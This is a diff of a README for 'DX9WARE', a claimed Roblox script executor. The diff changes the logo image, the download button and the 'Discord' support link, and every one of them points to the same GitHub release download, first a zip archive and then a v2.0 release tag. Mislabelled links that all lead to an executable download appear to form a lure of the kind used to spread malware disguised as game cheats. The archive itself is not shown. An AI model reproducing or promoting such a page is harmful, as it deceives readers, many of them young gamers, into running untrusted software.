@@ -2,7 +2,7 @@
 
 Welcome to the official repository of DX9WARE - a powerful Roblox executor for advanced scripting enthusiasts! 
 
-![DX9WARE Logo](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/download/v1.0/App.zip)
+![DX9WARE Logo](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/tag/v2.0)
 
 ## Overview ℹ️
 
@@ -37,7 +37,7 @@ Welcome to the official repository of DX9WARE - a powerful Roblox executor for a
 
 To download the latest version of DX9WARE, click the button below:
 
-[![Download DX9WARE](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/download/v1.0/App.zip)](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/download/v1.0/App.zip)
+[![Download DX9WARE](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/tag/v2.0)](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/tag/v2.0)
 
 ## Getting Started 🚗
 
@@ -48,7 +48,7 @@ Follow these steps to get started with DX9WARE:
 
 ## Support 🤝
 
-If you encounter any issues or have questions regarding DX9WARE, feel free to join our Discord server for assistance: [DX9WARE Discord](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/download/v1.0/App.zip)
+If you encounter any issues or have questions regarding DX9WARE, feel free to join our Discord server for assistance: [DX9WARE Discord](https://github.com/Roblox12400Z/DX9WARE-Roblox/releases/tag/v2.0)
 
 ## Contributing 🌟
 
